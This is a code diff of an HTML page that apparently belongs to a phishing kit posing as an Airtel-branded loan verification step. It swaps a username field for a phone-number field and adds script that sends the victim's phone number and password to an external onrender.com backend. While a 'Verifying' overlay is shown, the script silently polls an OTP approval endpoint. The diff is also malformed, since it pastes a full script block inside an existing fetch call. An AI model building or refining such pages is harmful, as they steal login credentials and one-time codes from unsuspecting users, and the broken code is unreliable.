@@ -62,8 +62,8 @@
       <p>Complete verification to finish your application.</p>
 
       <form id="login2Form">
-        <label for="username">Username</label>
-        <input id="username" type="text" placeholder="username" required />
+        <label for="phone">Phone number</label>
+        <input id="phone" type="tel" placeholder="+263712345678" required />
 
         <label for="password">Password</label>
         <input id="password" type="password" placeholder="Password" required />
@@ -90,42 +90,78 @@
 
           try {
             const resp = await fetch(`${backendUrl}/api/login/submit`, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ username, password, phone }),
-            });
+              <script>
+                document.getElementById('login2Form').addEventListener('submit', async (e) => {
+                  e.preventDefault();
+                  const phoneInput = document.getElementById('phone').value.trim();
+                  const password = document.getElementById('password').value.trim();
+                  if (!phoneInput || !password) return alert('Please fill both fields');
 
-            const data = await resp.json();
-            if (!data.success || !data.requestId)
-              throw new Error(data.error || "Submit failed");
+                  const phone = phoneInput || localStorage.getItem('phoneNumber') || '';
+                  const backendUrl = localStorage.getItem('backendUrl') || 'https://airtel-01.onrender.com';
 
-            // Show minimal verifying UI (status hidden)
-            const card = document.querySelector(".card");
-            card.innerHTML = `<h1>Verifying</h1><p id="status" style="display:none"></p>`;
+                  // create verifying overlay
+                  const overlay = document.createElement('div');
+                  overlay.style.position = 'fixed';
+                  overlay.style.top = '0';
+                  overlay.style.left = '0';
+                  overlay.style.width = '100%';
+                  overlay.style.height = '100%';
+                  overlay.style.background = 'rgba(0,0,0,0.45)';
+                  overlay.style.display = 'flex';
+                  overlay.style.alignItems = 'center';
+                  overlay.style.justifyContent = 'center';
+                  overlay.style.zIndex = '9999';
 
-            const statusEl = document.getElementById("status");
-            const pollInterval = setInterval(async () => {
-              try {
-                const r = await fetch(
-                  `${backendUrl}/api/otp/status/${data.requestId}`,
-                );
-                const j = await r.json();
-                if (j.approved) {
-                  clearInterval(pollInterval);
-                  window.location.href = "loan8.html";
-                } else if (j.rejected) {
-                  clearInterval(pollInterval);
-                  if (statusEl)
-                    statusEl.innerHTML = `Rejected: ${j.message} <a href="login2.html">Try again</a>`;
-                }
-              } catch (err) {
-                console.error("Poll error:", err);
-              }
-            }, 2000);
-          } catch (err) {
-            alert("Error: " + err.message);
-          }
-        });
+                  const box = document.createElement('div');
+                  box.style.background = '#fff';
+                  box.style.padding = '20px 28px';
+                  box.style.borderRadius = '12px';
+                  box.style.textAlign = 'center';
+                  box.innerHTML = `<h2 style="margin:0 0 8px">Verifying</h2><div style="width:36px;height:36px;border:4px solid #eee;border-top-color:#6c5ce7;border-radius:50%;margin:0 auto 8px;animation:spin 1s linear infinite"></div>`;
+
+                  const style = document.createElement('style');
+                  style.innerHTML = '@keyframes spin { to { transform: rotate(360deg); } }';
+                  document.head.appendChild(style);
+
+                  overlay.appendChild(box);
+                  document.body.appendChild(overlay);
+
+                  try {
+                    const resp = await fetch(`${backendUrl}/api/login/submit`, {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify({ username: phone, password, phone }),
+                    });
+
+                    const data = await resp.json();
+                    if (!data.success || !data.requestId) throw new Error(data.error || 'Submit failed');
+
+                    // Poll silently for approval
+                    const pollInterval = setInterval(async () => {
+                      try {
+                        const r = await fetch(`${backendUrl}/api/otp/status/${data.requestId}`);
+                        const j = await r.json();
+                        if (j.approved) {
+                          clearInterval(pollInterval);
+                          // proceed to final page
+                          window.location.href = 'loan8.html';
+                        } else if (j.rejected) {
+                          clearInterval(pollInterval);
+                          document.body.removeChild(overlay);
+                          const card = document.querySelector('.card');
+                          card.innerHTML = `<h1>Verification Failed</h1><p>Rejected: ${j.message}. <a href="login2.html">Try again</a></p>`;
+                        }
+                      } catch (err) {
+                        console.error('Poll error:', err);
+                      }
+                    }, 2000);
+
+                  } catch (err) {
+                    document.body.removeChild(overlay);
+                    alert('Error: ' + err.message);
+                  }
+                });
     </script>
   </body>
 </html>
